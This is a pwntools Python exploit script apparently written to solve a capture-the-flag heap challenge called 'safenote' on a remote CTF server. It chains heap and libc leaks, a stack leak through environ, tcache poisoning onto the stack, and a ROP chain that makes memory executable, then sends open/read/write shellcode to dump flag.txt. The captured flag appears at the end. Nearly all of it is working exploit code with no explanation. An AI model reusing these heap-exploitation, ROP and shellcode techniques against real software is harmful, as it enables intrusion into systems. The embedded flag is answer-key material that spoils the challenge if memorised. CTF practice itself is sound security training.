from pwn import *


def create(idx,size):
    p.sendlineafter("choice:","1")
    p.sendlineafter(":",str(idx))
    p.sendlineafter(":",str(size))
    print('created',idx)
def read(idx):
    p.sendlineafter("choice:","2")
    p.sendlineafter(":",str(idx))


def edit(idx,data):
    p.sendlineafter("choice:","3")
    p.sendlineafter(":",str(idx))
    p.sendafter(":",data)

def delete(idx):
    p.sendlineafter("choice:","4")
    p.sendlineafter(":",str(idx))

elf = context.binary = ELF("./safenote")
libc = elf.libc
env = {}
env["LD_PRELOAD"] = "./libc/libc.so.6"
# p = process(env=env)
p = remote("pwn.blitzhack.xyz",9088)


# open read write 
shellcode = asm("""
    xor rax, rax
    mov rax, 3
    mov rdi, 0
    syscall
                

    /* push "flag.txt" string onto stack (null-terminated) */
    xor rax, rax
    push rax                     /* null terminator */
    mov rbx, 0x7478742e67616c66  /* "flag.txt" reversed */
    push rbx
    mov rdi, rsp                 /* rdi -> "flag.txt" */

    /* open("flag.txt", O_RDONLY) */
    xor rsi, rsi                 /* O_RDONLY = 0 */
    mov rax, 2                   /* syscall: sys_open */
    syscall

    /* read(fd, rsp, 0x100) */
    mov rdi, rax                 /* fd */
    mov rsi, rsp                 /* buffer */
    mov rdx, 0x100
    xor rax, rax                 /* syscall: sys_read */
    syscall

    /* write(1, rsp, rax) */
    mov rdx, rax                 /* count */
    mov rax, 1                   /* syscall: sys_write */
    mov rdi, 1                   /* stdout */
    syscall
""")


# heap leak
for i in range(7):
    create(i,0xf0)
for i in range(7):
    delete(i)
for i in range(7):
    create(i,0xf0)
read(0)
p.recvuntil("Data: ")
heap_leak = u64(p.recvline().strip().ljust(8,b"\x00"))
print("[x] heap_leak",hex(heap_leak))



# overlap chunks
create(7,0xf8)
create(8,0xf0)
create(9,0xf0)
edit(7, p64(heap_leak + 0x1f0) * 2 + b"A" * 28 * 8 + p64(0x100))
edit(8,"8" * 8)

for i in range(7):
    delete(i)



# now unsorted points to our 7 chunks
# leak libc
delete(8)
read(7)
p.recvuntil("Data: ")
libc_leak = u64(p.recvline().strip().ljust(8,b"\x00"))
print("[x] libc_leak",hex(libc_leak))
libc.address = libc_leak  - 0x1ecbe0
print("[x] libc.address",hex(libc.address))



# 7 and 10 point to the same thing
# leak stack
create(10,0x110)
create(11,0x110)
delete(11)
delete(10)
edit(7,p64(libc.sym["environ"]))

create(10,0x110)
create(11,0x110)

read(11)
p.recvuntil("Data: ")
stack_leak = u64(p.recvline().strip().ljust(8,b"\x00"))
print("[x] stack_leak",hex(stack_leak))



# redo everything

for i in range(7):
    create(i,0x1f8)

create(7,0x128)
create(8,0x1f8)
create(9,0x1f8)
edit(7, p64(heap_leak + 0x1410) * 2 + b"A" * 34 * 8 + p64(0x130))
edit(8,"8" * 8)

for i in range(7):
    delete(i)


delete(8)


# next time we controle stack return 
# so we rop from there

create(10,0x130)
create(11,0x130)
delete(11)
delete(10)
edit(7,p64(stack_leak - 0x170))
create(10,0x130)
create(11,0x130)





rop = ROP(libc)
# gdb.attach(p,"b *read+26\nc\nc\n")
edit(11,flat([
    rop.rax.address, 0xa,
    rop.rdi.address, heap_leak - 0x6a0,
    rop.rsi.address, 0x400,
    rop.rdx.address, 7, 0,
    libc.address + 0x11fb89, # syscall,

    rop.rax.address, 0x0,
    rop.rdi.address, 0,
    rop.rsi.address, heap_leak - 0x6a0,
    rop.rdx.address, 0x400, 0,
    libc.address + 0x11fb89, # syscall,

    heap_leak - 0x6a0,
]))

input("SEND SHELL CODE")

p.sendline(shellcode)


p.interactive()

# Blitz{s4f3_n0t3_n0t_s0_s4f3_wh3n_r34d_h4s_nUll_t3rmin4T10n}